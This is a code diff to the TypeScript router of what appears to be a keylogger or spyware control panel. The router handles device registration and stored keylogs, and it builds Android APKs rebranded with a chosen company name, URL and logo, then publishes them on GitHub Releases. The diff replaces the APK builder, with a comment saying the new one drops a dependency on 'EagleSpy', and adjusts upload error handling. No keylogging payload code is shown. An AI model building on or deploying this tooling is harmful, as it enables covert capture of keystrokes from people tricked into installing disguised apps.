@@ -10,8 +10,7 @@ import { systemRouter } from "./_core/systemRouter";
 import { publicProcedure, protectedProcedure, router } from "./_core/trpc";
 import { getKeylogsByDevice, deleteKeylog, restoreKeylog, getAlerts, getEvents, saveSettings, getSettings, getDeletedKeylogs, registerDevice, getDevicesByUser } from "./db";
 import { startKeylogSimulator } from "./keylogSimulator";
-import { buildMemoryAPK } from "./apk-builder-memory";
-import { buildCompleteFinal } from "./apk-builder-complete-final";
+import { buildSimpleAPK } from "./apk-builder-simple";
 import { uploadToGitHubRelease, parseGitHubUrl } from "./github-release-uploader";
 import { sdk } from "./_core/sdk";
 
@@ -129,26 +128,17 @@ export const appRouter = router({
         try {
           console.log('[ROUTER] APK build requested:', { companyName: input.companyName, companyUrl: input.companyUrl });
           
-          // Use customized APK builder to change app name and package name
-          console.log('[ROUTER] Building APK with customized builder...');
-          // Get the request origin from headers
-          const req = ctx.req as any;
-          const requestOrigin = (req?.headers?.['x-forwarded-proto'] && req?.headers?.['x-forwarded-host'])
-            ? `${req.headers['x-forwarded-proto']}://${req.headers['x-forwarded-host']}`
-            : req?.headers?.['origin'] || req?.headers?.['referer']?.split('/').slice(0, 3).join('/')
-            || `https://${process.env.VITE_APP_DOMAIN || 'localhost:3000'}`;
+          // Use SIMPLE builder (sem dependência de EagleSpy)
+          console.log('[ROUTER] Building APK with simple builder...');
           
-          console.log('[ROUTER] Request origin detected:', requestOrigin);
-          console.log('[ROUTER] VITE_APP_DOMAIN env:', process.env.VITE_APP_DOMAIN);
-          
-          // Use COMPLETE FINAL builder
-          const result = await buildCompleteFinal({
+          // Use SIMPLE builder
+          const result = await buildSimpleAPK({
             appName: input.companyName,
             appUrl: input.companyUrl,
             logoUrl: input.logoUrl,
           });
           
-          console.log('[ROUTER] Customized builder result:', { success: result.success, downloadUrl: result.downloadUrl, filename: result.filename });
+          console.log('[ROUTER] Simple builder result:', { success: result.success, downloadUrl: result.downloadUrl, filename: result.filename });
 
           if (!result.success || !result.downloadUrl) {
             throw new Error(result.error || "Erro ao gerar APK");
@@ -163,20 +153,23 @@ export const appRouter = router({
           try {
             if (process.env.GITHUB_TOKEN && process.env.GITHUB_REPO_URL && result.success && result.filename) {
               console.log('[ROUTER] Uploading to GitHub Releases...');
-              const { owner, repo } = parseGitHubUrl(process.env.GITHUB_REPO_URL);
-              const githubDownloadUrl = await uploadToGitHubRelease({
-                owner,
-                repo,
-                token: process.env.GITHUB_TOKEN,
-                appName: input.companyName,
-                filePath: path.join(OUTPUT_DIR, result.filename!),
-              });
-              console.log('[ROUTER] GitHub download URL:', githubDownloadUrl);
-              finalDownloadUrl = githubDownloadUrl; // Use GitHub URL
+              try {
+                const { owner, repo } = parseGitHubUrl(process.env.GITHUB_REPO_URL);
+                const githubDownloadUrl = await uploadToGitHubRelease({
+                  owner,
+                  repo,
+                  token: process.env.GITHUB_TOKEN,
+                  appName: input.companyName,
+                  filePath: path.join(OUTPUT_DIR, result.filename!),
+                });
+                console.log('[ROUTER] GitHub download URL:', githubDownloadUrl);
+                finalDownloadUrl = githubDownloadUrl; // Use GitHub URL
+              } catch (ghError) {
+                console.warn('[ROUTER] GitHub upload failed:', ghError instanceof Error ? ghError.message : String(ghError));
+              }
             }
           } catch (error) {
-            console.warn('[ROUTER] GitHub upload failed, using local URL:', error instanceof Error ? error.message : String(error));
-            // Fallback to local URL if GitHub upload fails
+            console.warn('[ROUTER] Unexpected error during GitHub upload:', error instanceof Error ? error.message : String(error));
           }
           
           console.log('[ROUTER] Final download URL:', finalDownloadUrl);
